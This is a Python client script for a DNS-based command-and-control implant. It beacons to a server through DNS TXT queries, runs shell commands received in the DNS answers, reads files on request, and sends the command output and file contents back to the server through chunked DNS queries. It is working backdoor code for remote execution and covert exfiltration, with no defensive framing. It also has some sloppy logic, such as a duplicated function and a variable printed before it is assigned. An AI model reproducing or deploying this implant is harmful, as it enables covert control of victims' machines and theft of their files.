from dns_c2_modules import *

cond = 0

def RunCommand(cmd):
    return subprocess.getoutput(cmd)
    
def signal_handler(sig, frame):
    print(' Exiting...')
    sys.exit(0)
    
def read_file(file_name):
    with open(file_name, "rb") as f:
        return f.read()

def send_qery(dest_adr,data,is_output): 
    for chunk in range(0, len(data), MTU_SIZE - HEADER_SIZE):
        x = chunk
        if is_output == 1:                          # if in_transfer flag is required
            content = IN_TRANSFER
            content+=data[x:x+1400]
            pkt = IP(dst=dest_adr)/UDP(sport="1234")/DNS(qd=DNSQR(qtype="TXT", qname=content))
        else:
            pkt = IP(dst=dest_adr)/UDP()/DNS(qd=DNSQR(qtype="TXT", qname=data))
        send(pkt)
        time.sleep(100/1000)

def bin_to_str(bin_data):
    return bin_data.decode('utf-8')

def read_file(file_name):
    with open(file_name, "rb") as f:
        return f.read()
        
def send_beacon(addr,data):
    while cond == 0:
        # pkt_no_data = IP(dst=addr)/ICMP(type="echo-request")
        # pkt_send(pkt_no_data,data,0)
        #pkt_no_data = IP(dst=addr)/UDP()/DNS(qd=DNSQR(qtype="TXT", qname=base64.b64encode(data)))
        
        send_qery(addr,data,0)
        print("send beacon")
        time.sleep(5)
    

def parse_packet(packet):
    
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 1:
        global cond
        print("client in parse")
        cond = 1
        #get_an = packet[DNS].qd.rdata
        get_an = packet[1][DNSRR].rdata
        print("answer:")
        print(get_an)
 
        if get_an[0].startswith(RUN):
            print("model run")
            prefix_packet = RUN
            
        elif get_an[0].startswith(FILE):
            print("model file")
            prefix_packet = FILE

            print("prefix:")
            print(prefix_packet)
            print("data receieved:")
            print(data_recieved)
        
        if prefix_packet == RUN or prefix_packet == FILE:
            print("recieved response!")
            data_recieved = get_an[len(prefix_packet):]
            data_recieved = str(data_recieved)
            print("data recieved:" + data_recieved)
            print(type(data_recieved))
            txt_recieved = bin_to_str(data_recieved)     # the plaintxt of the command
            if prefix_packet == RUN:
                print("command is: "+txt_recieved)
                output = RunCommand(txt_recieved)
                bin_output = bytes(output.encode())
                send_qery(SERVER_ADR,BEGIN_OUTPUT+data_recieved,0)
                send_qery(SERVER_ADR,bin_output,1)
            else:
                print("file is: "+data_recieved)
                output = read_file(txt_recieved)   # read in binary mode
                send_qery(SERVER_ADR,BEGIN_FILE +data_recieved,0)
                send_qery(SERVER_ADR,output,1)
            send_qery(SERVER_ADR,EF,0)
                
        cond = 0
        print("cond changed to " + str(cond))
        

def client_listen():
    print("client start listening")
    sniff_pkt(pfilter="udp and host " + SERVER_ADR,handler=parse_packet)
    

if __name__=="__main__":
    signal.signal(signal.SIGINT, signal_handler)
    beacon_thread = threading.Thread(target=send_beacon, args=(SERVER_ADR,BEACON))
    beacon_thread.start()
    client_listen()
